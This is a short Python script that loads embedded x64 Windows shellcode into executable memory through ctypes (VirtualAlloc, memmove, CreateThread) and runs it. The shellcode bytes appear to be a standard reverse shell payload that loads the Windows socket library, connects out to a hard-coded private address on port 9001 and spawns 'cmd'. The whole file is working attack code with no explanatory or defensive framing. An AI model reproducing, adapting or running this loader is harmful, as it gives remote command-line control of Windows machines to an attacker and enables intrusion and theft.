import ctypes

shellcode = (
b""
b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41"
b"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48"
b"\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20"
b"\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31"
b"\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20"
b"\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41"
b"\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0"
b"\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67"
b"\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20"
b"\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34"
b"\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac"
b"\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1"
b"\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58"
b"\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
b"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
b"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a"
b"\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41"
b"\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
b"\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f"
b"\x33\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81"
b"\xec\xa0\x01\x00\x00\x49\x89\xe5\x49\xbc\x02"
b"\x00\x23\x29\xc0\xa8\x01\xf4\x41\x54\x49\x89"
b"\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff"
b"\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41"
b"\xba\x29\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31"
b"\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2\x48"
b"\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0"
b"\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
b"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff"
b"\xd5\x48\x81\xc4\x40\x02\x00\x00\x49\xb8\x63"
b"\x6d\x64\x00\x00\x00\x00\x00\x41\x50\x41\x50"
b"\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0\x6a\x0d"
b"\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01"
b"\x01\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89"
b"\xe6\x56\x50\x41\x50\x41\x50\x41\x50\x49\xff"
b"\xc0\x41\x50\x49\xff\xc8\x4d\x89\xc1\x4c\x89"
b"\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48\x31"
b"\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d"
b"\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6"
b"\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06"
b"\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72"
b"\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5"
)

# Wrap shellcode in mutable buffer
buf = ctypes.create_string_buffer(shellcode)

# Allocate memory
kernel32 = ctypes.windll.kernel32
kernel32.VirtualAlloc.restype = ctypes.c_void_p  # ‚Üê FIX
ptr = kernel32.VirtualAlloc(
    None, len(buf), 0x3000, 0x40)

if not ptr:
    raise OSError(f"VirtualAlloc failed. Got ptr: {hex(ptr)}")

# Use raw pointer to copy shellcode
ctypes.memmove(ctypes.c_void_p(ptr), buf, len(buf))

# Create thread to run it
handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_void_p(None), 0,
    ctypes.c_void_p(ptr),
    ctypes.c_void_p(None), 0,
    ctypes.pointer(ctypes.c_ulong(0))
)

# Wait for shellcode to finish
ctypes.windll.kernel32.WaitForSingleObject(handle, -1)